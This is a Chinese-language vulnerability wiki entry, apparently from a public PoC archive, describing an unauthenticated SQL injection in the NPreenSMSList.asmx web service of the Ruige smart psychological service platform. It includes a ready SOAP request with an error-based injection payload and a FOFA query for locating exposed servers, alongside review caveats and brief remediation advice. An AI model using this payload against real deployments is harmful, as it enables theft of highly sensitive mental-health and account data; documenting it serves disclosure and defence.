---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "瑞格智慧心理服务平台 NPreenSMSList Seach sqlwhere SQL注入"
product: "瑞格智慧心理服务平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%99%BA%E6%85%A7%E5%9F%8E%E5%B8%82%E7%B3%BB%E7%BB%9F/%E7%91%9E%E6%A0%BC%E6%99%BA%E6%85%A7%E5%BF%83%E7%90%86%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0%20NPreenSMSList.asmx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
fofa: "body=\"瑞格智慧心理服务平台\""
fofa_unverified: "body="
id: "vw-20f3002db2f733f0a86b245c"
entity_id: "ve-20f3002db2f733f0a86b245c"
schema_version: "1"
---

# 瑞格智慧心理服务平台 NPreenSMSList Seach sqlwhere SQL注入

## 条目说明

- 对象与具体问题：瑞格智慧心理服务平台；NPreenSMSList Seach sqlwhere SQL注入
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 智慧城市系统目录不符，应心理服务/健康软件独立产品；Seach拼写按接口真实保留
- Content-Length字面length非法，HTTP/XML需围栏
- 版本回显仅图未核，写木马/在野已知无来源；高敏心理数据应最小证据
- 补固定版本/厂商修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

瑞格智慧心理服务平台 NPreenSMSList.asmx 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

瑞格智慧心理服务平台

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="瑞格智慧心理服务平台"

POC/EXP：

```http
POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "RuiGe.WebUi.NPreenSMS/Seach"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Seach xmlns="RuiGe.WebUi.NPreenSMS">
      <sqlwhere>and 1=convert(int,@@VERSION)</sqlwhere>
    </Seach>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。


![image-20241029130603882](./.resource/瑞格智慧心理服务平台NPreenSMSList.asmxSQL注入漏洞复现/media/image-20241029130603882.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
